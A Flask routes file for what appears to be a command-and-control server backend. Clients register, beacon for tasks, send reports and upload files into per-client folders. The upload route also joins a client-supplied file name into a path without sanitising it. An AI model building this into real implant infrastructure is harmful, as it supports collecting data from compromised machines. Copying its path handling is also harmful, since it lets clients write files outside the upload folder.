from flask import Blueprint, request, jsonify
from .models import User
from . import db
from server.services.user_service import register_user
from server.services.beacon_service import BeaconService
import uuid
import os

beaconService = BeaconService()

bp = Blueprint("routes", __name__)
@bp.route("/register", methods=["POST"])
def register():
    data = request.json
    username = data.get("username")
    client_id = data.get("client_id")
    op_system = data.get("op_system")
    
    if not client_id:
        client_id = str(uuid.uuid4())
    response = register_user(username, client_id, request.remote_addr, op_system)
    return jsonify(response)

@bp.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    client_id = data.get("client_id")
    
    response = beaconService.handle_beacon_request(client_id)
    return jsonify(response)

@bp.route('/report', methods=['POST'])
def report():
    data = request.json
    print(f"[+] Report from client: {data}")
    response = {"status": "recieved"}
    return jsonify(response)

@bp.route('/upload', methods=['POST'])
def upload():
    file = request.files.get("file")
    data = request.form
    client_id = data["client_id"]
    file_name = data["file_name"]
    fdl_key = data["fdl_key"]
    
    if not BeaconService.verify_otk(client_id, fdl_key):
        # TODO: Implement logging to database with request details
        print("[!] Recieved unauthorized call to /upload")
        return
        
    BASE_UPLOAD_PATH = os.path.join(r"Uploads", client_id)
    
    if os.path.exists(BASE_UPLOAD_PATH):
        file.save(os.path.join(BASE_UPLOAD_PATH, file_name))
        print(f"[+] Successfully downloaded file: {file_name}")
    else:
        print(f"Directory for {client_id} does not exist.")
        
    return jsonify({"status": "SUCCESS"})
        
    
    